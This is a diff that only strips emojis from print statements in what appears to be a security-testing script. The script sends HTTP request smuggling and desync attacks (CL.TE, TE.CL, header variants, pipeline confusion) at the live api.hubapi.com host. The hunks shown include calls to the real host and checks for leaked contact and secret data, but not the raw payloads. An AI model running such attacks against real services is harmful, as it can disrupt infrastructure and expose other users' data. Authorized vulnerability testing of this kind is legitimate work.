@@ -15,7 +15,7 @@ ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
 TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
 
 print("="*80)
-print("🔪 HTTP Request Smuggling & Protocol Attacks")
+print(" HTTP Request Smuggling & Protocol Attacks")
 print("="*80)
 
 def send_raw_request(host, port, request, use_ssl=True):
@@ -79,7 +79,7 @@ def test_cl_te_smuggling():
     print(f"Response length: {len(response)}")
 
     if 'firstname' in response.lower() or 'super_secret' in response.lower():
-        print("🚨 POTENTIAL SMUGGLING SUCCESS!")
+        print(" POTENTIAL SMUGGLING SUCCESS!")
         print(response[:500])
         return response
     else:
@@ -112,7 +112,7 @@ def test_te_cl_smuggling():
     response = send_raw_request('api.hubapi.com', 443, request)
 
     if 'firstname' in response or 'super_secret' in response:
-        print("🚨 POTENTIAL SMUGGLING SUCCESS!")
+        print(" POTENTIAL SMUGGLING SUCCESS!")
         print(response[:500])
         return response
     else:
@@ -194,7 +194,7 @@ def test_http_desync():
         response = send_raw_request('api.hubapi.com', 443, request)
 
         if 'firstname' in response or 'super_secret' in response:
-            print(f"🚨 SUCCESS with: {te_header}")
+            print(f" SUCCESS with: {te_header}")
             print(response[:500])
             return response
 
@@ -224,14 +224,14 @@ def test_pipeline_confusion():
     print(f"Response length: {len(response)}")
 
     if 'super_secret' in response:
-        print("🚨 POTENTIAL SUCCESS!")
+        print(" POTENTIAL SUCCESS!")
         print(response[:500])
 
 # ============================================================================
 # MAIN
 # ============================================================================
 
-print("\n⚠️ Warning: These are aggressive protocol attacks")
+print("\n Warning: These are aggressive protocol attacks")
 print("Testing HTTP smuggling vulnerabilities...\n")
 
 test_cl_te_smuggling()
@@ -242,5 +242,5 @@ test_http_desync()
 test_pipeline_confusion()
 
 print("\n" + "="*80)
-print("✅ HTTP Smuggling Tests Complete")
+print(" HTTP Smuggling Tests Complete")
 print("="*80)
